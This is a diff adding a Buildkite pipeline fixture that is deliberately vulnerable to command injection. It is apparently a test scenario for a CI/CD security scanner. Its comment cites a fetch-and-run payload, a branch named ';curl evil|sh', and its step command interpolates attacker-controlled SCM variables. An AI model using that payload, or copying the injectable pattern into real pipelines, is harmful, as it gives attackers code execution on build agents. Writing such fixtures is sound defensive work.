@@ -1,0 +1,17 @@
+# scenarios/79-buildkite-var-injection
+# CICD-SEC-4 (Poisoned Pipeline Execution) — Buildkite
+#
+# Pattern: an attacker-influenced Buildkite environment variable
+# (`$BUILDKITE_BRANCH`, `$BUILDKITE_PULL_REQUEST_*`, `$BUILDKITE_MESSAGE`) used
+# unquoted in a step `command:`. Branch/PR/commit metadata are attacker-
+# controllable, so a branch named `;curl evil|sh` yields command execution on
+# the agent. Same class as scenarios 56 / 62.
+#
+# SAFETY: static fixture, nested under scenarios/ — Buildkite only runs the
+# pipeline a connected agent is configured to upload, never a nested file.
+# See README.md.
+
+steps:
+  - label: ":hammer: build"
+    # DANGER — unquoted attacker-controlled SCM metadata in the command.
+    command: echo "Building branch $BUILDKITE_BRANCH" && ./build.sh "$BUILDKITE_MESSAGE"
